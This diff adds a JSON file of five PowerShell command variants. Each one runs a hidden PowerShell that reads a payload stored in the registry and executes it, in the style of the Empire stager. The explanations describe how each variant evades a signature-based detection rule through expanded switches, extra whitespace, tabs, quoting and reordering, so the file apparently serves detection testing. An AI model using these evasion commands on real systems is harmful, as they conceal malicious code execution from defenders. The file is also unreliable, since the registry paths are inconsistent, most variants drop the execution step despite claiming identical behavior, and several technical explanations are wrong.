@@ -1,0 +1,22 @@
+[
+  {
+    "output": "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"$x=$((Get-ItemProperty HKCU:Software\\Microsoft\\WindowsUpdate).Update); Invoke-Expression $x\"",
+    "explanation": "Substitution technique: Expanding the highly specific short-form switches ('-NoP', '-NonI', '-w', '-c', and 'gp') used by Empire into their official full-length PowerShell parameter equivalents ('-NoProfile', '-NonInteractive', '-WindowStyle', '-Command', and 'Get-ItemProperty'). This completely changes the literal string layout required by the rule's strict 'CommandLine|contains' criteria while preserving 100% equivalent behavior in a test execution environment."
+  },
+  {
+    "output": "powershell.exe  -NoP  -NonI  -w  Hidden  -c  $x=$((gp  HKCU:Software\\Microsoft\\Windows Update).Update)",
+    "explanation": "Insertion technique: Injecting multiple consecutive spaces between the parameter blocks instead of the single-space padding present in the default rule signatures. The Windows process loader and PowerShell's core parser automatically normalize and condense contiguous whitespace boundaries during initialization, causing the strict literal sequence search to fail while functional execution remains unaffected."
+  },
+  {
+    "output": "powershell.exe\t-NoP\t-NonI\t-w\tHidden\t-c\t$x=$((gp\tHKCU:Software\\Microsoft\\Windows Update).Update)",
+    "explanation": "Substitution technique: Replacing the structural single space parameter separators with horizontal tab characters ('\\t'). The native Windows execution subsystem and command tokenizers handle horizontal tabs as valid whitespace argument delimiters. This safely preserves the bypass functionality in a test environment while entirely blinding the space-padded continuous string checks."
+  },
+  {
+    "output": "powershell.exe \"-NoP\" \"-NonI\" \"-w\" \"Hidden\" \"-c\" \"$x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update)\"",
+    "explanation": "Insertion technique: Individual token encapsulation utilizing double quotes around each distinct parameter block. The operating system kernel transparently processes and strips outer quotation marks during child process creation tokenization, successfully breaking continuous signature string matching over the command line buffer while populating the parameters normally."
+  },
+  {
+    "output": "powershell.exe -NonI -NoP -w Hidden -c \"$x=$((gp 'HKCU:Software\\Microsoft\\Windows Update').Update)\"",
+    "explanation": "Reordering and Insertion technique: Swapping the sequential execution order of the independent flags ('-NonI' before '-NoP') and adding single quotes around the registry path provider. PowerShell processes these global parameters regardless of their relative position on the command line, easily subverting the rule's static hardcoded sequence assumptions."
+  }
+]
